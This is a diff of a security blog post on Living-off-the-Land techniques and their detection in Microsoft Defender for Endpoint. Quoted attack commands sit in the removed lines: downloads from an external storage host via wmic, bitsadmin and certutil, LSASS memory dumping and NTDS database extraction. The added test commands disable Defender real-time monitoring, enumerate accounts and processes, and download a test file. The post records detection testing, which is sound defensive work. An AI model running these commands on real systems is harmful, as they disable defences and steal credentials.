@@ -1,7 +1,8 @@
 # LotL techniques with MDE detection - Part 1 
 Hello everyone,
 
-For a long time, I have seen Living off the Land (LotL) techniques discussed in Microsoft Security blogs, and recently I have been learning various attack techniques, especially those related to LotL. That's why I believe this is a great time to share my learning and detection insights in MDE through this blog.
+For a long time, I have seen Living off the Land (LotL) techniques discussed in Microsoft Security blogs, and recently I have been learning various attack techniques, especially those related to LotL. 
+That's why I believe this is a great time to share my learning and detection insights in MDE through this blog.
 
 ### What is living off the land ?
 
@@ -22,57 +23,39 @@ This is a somewhat older blog, but I love it because it includes some Windows Lo
 
 **WMI** : Query the operating system (OS) for specific properties and then formats the output using a custom format file located at a URL.
 
-```cmd
-Wmic.exe os get ved5hit39, 25hit8, numberofusers /format:"https://storage.googleapis.com/ultramaker/09/v.txt"
-```
-```cmd
-Wmic.exe os get QMUTSQPK, JUXKBVOK, LNFTZKMH, freephyscialmemory /format:"https://storage.googleapis.com/ultramaker/08/vv.txt" 
-```
-
 **Bitsadmin / Certutil** : The commands bitsadmin and certutil can be exploited in cyberattacks, particularly in the context of malware delivery and command-and-control (C2) activities, such as downloading and uploading files.
-
-
-```cmd
-bitsadmin.exe /transfer msd5 /priority foreground https://storage.googleapis.com/ultramaker/x/ 09/falcvonxrenwb.jpg.zip.log? %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z
-```
-
-```cmd
-certutil.exe -urlcache -f "<URL/Payload>" "%Temp%\demo.exe"
-```
-```cmd
-certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z %PUBLIC%\Libraries\temporary\falxconxrenwb.~
-```
 
 ![image](https://github.com/user-attachments/assets/f3ba69a1-f9bf-4300-9b03-551917f9875f)
 > Astaroth “living-off-the-land” attack chain showing multiple legitimate tools abused
 ---
 
-### [Volt Typhoon](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)
+## Microsoft Defender for Endpoint detection alerts
 
-1. WMI
-2. LSASS Process dumping (LotL)
-   - cmd.exe / powershell.exe
-   - rundll32.exe
-   - base64 encode 
-3. ntdsutil.exe
-
+**Test commands**
 ```cmd
-cmd.exe /c powershell -exec bypass -W hidden -nop -E <Base64>
+wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
+wmic process get caption,executablepath,commandline /format:csv  > %Temp%\commands.csv
+wmic useraccount get /ALL /format:csv > %Temp%\UserAccounts.csv
+wmic qfe get description,installedOn /format:csv > %Temp%\installedapp.csv
+wmic process call create "cmd.exe /c certutil -urlcache -f \"https://aka.ms/ioavtest\" \"%TEMP%\\validatecloud.exe\""
+wmic process call create "cmd.exe /c bitsadmin /transfer mydownloadjob /download /priority high \"https://aka.ms/ioavtest\" \"%TEMP%\\validatecloud.exe\""
 ```
 
-```cmd
-rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> %Temp%\lsass.dmp full
-```
+***The pentest device was protected by Defender Antivirus and Microsoft Defender for Endpoint, with Tamper Protection turned on.***
 
-```cmd
-wmic /node: /user: /password: process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \"as i ntds\" ifm \"create full C:\Windows\Temp\tmp" q q"
-```
+These alerts have been detected by MDE.
+- Suspicious Process Discovery
+- Suspicious User Account Discovery
+- Anomalous account lookups
+- Suspicious WMI process creation
+- Suspicious file creation by BITSAdmin tool
+- Use of living-off-the-land binary to run malicious code
+- Suspicious behavior by cmd.exe was observed
 
-```cmd
-cmd.exe /c ntdsutil "as i ntds" ifm "create full C:\Windows\Temp\pro" q q
-```
 
-![image](https://github.com/user-attachments/assets/6ed56eeb-f118-46d7-997a-4f0e58fd20af)
+![image](https://github.com/user-attachments/assets/0cb41402-9fe2-4c2c-970e-3511bbb0aa1e)
 
->  Volt Typhoon attack diagram
----
+![image](https://github.com/user-attachments/assets/45ad9fcc-1fcb-427b-8876-45b6b74df524)
+
+#### Disclaimer
+The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
